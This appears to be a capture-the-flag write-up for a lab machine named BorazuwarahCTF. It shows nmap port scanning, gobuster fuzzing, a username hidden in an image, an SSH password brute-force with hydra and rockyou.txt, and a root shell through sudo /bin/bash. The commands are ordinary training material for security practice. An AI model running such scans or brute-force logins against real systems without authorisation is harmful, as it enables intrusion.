# BorazuwarahCTF
![image](https://github.com/user-attachments/assets/30562465-cc76-411d-9c42-d8cf6859c980)

## Recognition and Enumeration.

Check that the machine is running.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Once we get a ping response, we can start enumerating the machine. The ttl=64 can tell us that it is a **Linux** machine.

We launch nmap to see what ports it finds.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Performs a SYN scan.
- `-p-`: Scans all ports.
- `--open`: Shows only open ports.
- `--min-rate 5000`: Sets the minimum packet forwarding rate to 5000 per second.
- `-vvv`: Generates very verbose and detailed output.
- `-n`: Prevents reverse DNS resolution.
- `-Pn`: Skips host discovery.
- `-oG allPorts`: Saves results to a file named "allPorts".
- `172.17.0.2`: The IP address of the target host.
```
```
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 64
80/tcp open http syn-ack ttl 64
```
Since we have port 22 and 80 open, we are going to check the version and run some basic scripts to see what information we get.

```bash
nmap -sCV -p22,80 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Scan for versions and vulnerabilities.
- `-p22,80`: Scan for ports.
- `-vvv`: Very detailed and verbose output.
- `-oN versionPorts`: Save the results in "versionPorts".
- `172.17.0.2`: IP address of the scanned host.
```
```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
| 256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDuOdJLZN+CNU+7dcTJQbPr6zY2+Ou1YFR0w9Pan1DfaPUZljRHJcNmvSncrihzQ3HOAHfMWWvSzN+ZMC0YmWoA=
| 256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGDv2JqKvBCR+Badmkr7YKPypEYshuCXxzM5+YdozyBD
80/tcp open http syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods:
|_ Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
We use **gobuster** to fuzz and see if we find directories or pages on port 80.

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
We only find ***index.html*** in which we only see an image that we proceed to download to see if we find something hidden inside.

![image](https://github.com/user-attachments/assets/0e4abfa4-931c-40b0-800f-7d2921f4f966)

We see that inside the image we find a user **borazuwarah** that we can use to connect via ***ssh*** by brute force with **hydra**.

## Exploitation.

```
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![image](https://github.com/user-attachments/assets/d8d5ad7e-5e8c-4f21-8be9-3631844b1349)

Now we connect via **ssh** with the credentials obtained.

![image](https://github.com/user-attachments/assets/481a1e42-2d48-4fe3-b56f-4b320d8b4942)

## Privilege escalation.

We check if there is any binary that we can exploit and we find that we can run as **root** a **/bin/bash**.

![image](https://github.com/user-attachments/assets/65af5a3f-6ad7-4ca0-bc70-fdcf3049cd2a)

```
sudo -u root /bin/bash
```
![image](https://github.com/user-attachments/assets/84a75270-1f2a-4748-8eb0-6f194110f104)
